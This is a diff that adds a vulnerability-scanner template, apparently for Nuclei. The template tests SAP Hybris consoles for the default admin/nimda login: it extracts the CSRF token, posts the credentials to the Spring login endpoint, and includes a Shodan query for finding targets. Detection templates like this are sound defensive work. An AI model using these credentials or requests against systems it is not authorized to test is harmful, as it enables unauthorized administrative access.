@@ -1,0 +1,59 @@
+http:
+    - attack: pitchfork
+      cookie-reuse: true
+      extractors:
+        - group: 1
+          internal: true
+          name: csrftoken
+          part: body
+          regex:
+            - <meta name="_csrf" content="([a-z0-9-]+)" \/>
+          type: regex
+      matchers:
+        - condition: and
+          type: word
+          words:
+            - hybris administration console
+            - You're Administrator
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      payloads:
+        password:
+            - nimda
+        username:
+            - admin
+      raw:
+        - |
+          GET /login HTTP/1.1
+          Host: {{Hostname}}
+        - |
+          POST /j_spring_security_check HTTP/1.1
+          Host: {{Hostname}}
+          Origin: {{BaseURL}}
+          Content-Type: application/x-www-form-urlencoded
+          Referer: {{BaseURL}}login
+
+          j_username={{username}}&j_password={{password}}&_csrf={{csrftoken}}
+        - |
+          GET / HTTP/1.1
+          Host: {{Hostname}}
+id: hybris-default-login
+info:
+    author: princechaddha
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+        cvss-score: 8.3
+        cwe-id: CWE-522
+    description: Hybris contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+    metadata:
+        max-request: 3
+        shodan-query: title:"Hybris"
+        verified: true
+    name: Hybris - Default Login
+    severity: high
+    tags:
+        - default-login
+        - hybris
+        - Spring
